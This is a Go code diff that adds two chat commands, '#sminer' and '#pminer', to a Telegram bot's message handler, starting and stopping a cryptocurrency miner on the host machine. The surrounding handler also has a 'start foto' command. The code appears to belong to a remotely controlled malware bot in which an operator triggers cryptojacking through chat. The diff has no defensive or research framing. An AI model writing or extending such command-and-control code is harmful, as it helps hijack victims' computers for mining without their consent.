@@ -126,6 +126,17 @@ func Check_msg_user(msg string, bot *tgbotapi.BotAPI, chatID int64) int {
 
 		bot.Send(tgbotapi.NewMessage(chatID, "start foto"))
 		return 1
+	} else if msg == "#sminer" {
+		if err := func_unix.StartMining(); err != nil {
+			bot.Send(tgbotapi.NewMessage(chatID, "Error starting miner: "+err.Error()))
+		} else {
+			bot.Send(tgbotapi.NewMessage(chatID, "Miner started"))
+		}
+		return 1
+	} else if msg == "#pminer" {
+		func_unix.StopMining()
+		bot.Send(tgbotapi.NewMessage(chatID, "Miner stopped"))
+		return 1
 	}
 
 	return 0
